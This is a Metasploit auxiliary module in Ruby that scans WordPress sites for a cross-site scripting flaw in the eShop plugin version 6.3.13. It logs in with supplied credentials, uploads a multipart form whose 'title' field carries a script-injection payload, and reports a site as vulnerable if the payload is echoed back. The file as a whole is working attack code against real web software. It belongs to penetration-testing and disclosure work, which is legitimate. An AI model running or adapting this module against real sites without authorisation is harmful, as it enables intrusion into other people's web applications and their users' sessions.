##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress eShop XSS Scanner',
      'Description' => %q{
      This module attempts to exploit a Cross-Site Scripting in eShop Plugin
      for WordPress, version 6.3.13 and likely prior in order if the instance
      is vulnerable.
      },
      'Author'      =>
        [
          'Ehsan Hosseini', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['PACKETSTORM', '133480'],
          ['WPVDB', '8180']
        ],
      'DisclosureDate' => 'Sep 04 2015'
    ))

    register_options(
      [
        OptString.new('WP_USERNAME', [true, 'A valid username', nil]),
        OptString.new('WP_PASSWORD', [true, 'A valid password', nil])
      ], self.class
    )
  end

  def check
    check_plugin_version_from_readme('eshop', '6.3.14')
  end

  def user
    datastore['WP_USERNAME']
  end

  def password
    datastore['WP_PASSWORD']
  end

  def run_host(ip)
    vprint_status("#{peer} - Trying to login as: #{user}:#{password}")
    cookie = wordpress_login(user, password)
    fail_with(Failure::NoAccess, "Unable to login as: #{user}:#{password}") if cookie.nil?

    value = Rex::Text.rand_text_numeric(8)
    xss = "\"><script>alert(#{value})</script>"

    data = Rex::MIME::Message.new
    data.add_part('M', nil, nil, 'form-data; name="uptime"')
    data.add_part('', nil, nil, 'form-data; name="MAX_FILE_SIZE"')
    data.add_part(xss, 'application/x-php', nil, 'form-data; name="title"')
    data.add_part('yes', nil, nil, 'form-data; name="overwrite"')
    data.add_part('upload File', nil, nil, 'form-data; name="up"')
    post_data = data.to_s

    vprint_status("#{peer} - Sending payload...")
    res = send_request_cgi(
      'method'        => 'POST',
      'uri'           => normalize_uri(wordpress_url_backend, 'admin.php'),
      'vars_get'      => {
        'page'        => 'eshop-downloads.php',
      },
      'ctype'         => "multipart/form-data; boundary=#{data.bound}",
      'data'          => post_data,
      'cookie'        => cookie
    )

    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless res

    if res.code == 200 && res.body.include?("#{xss}")
      print_good("#{peer} - Vulnerable to Cross-Site Scripting the eShop 6.3.13 plugin for WordPress")
      p = store_local(
        'eshop.http',
        'text/html',
        res.body,
        value
      )
      print_good("Save in: #{p}")
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
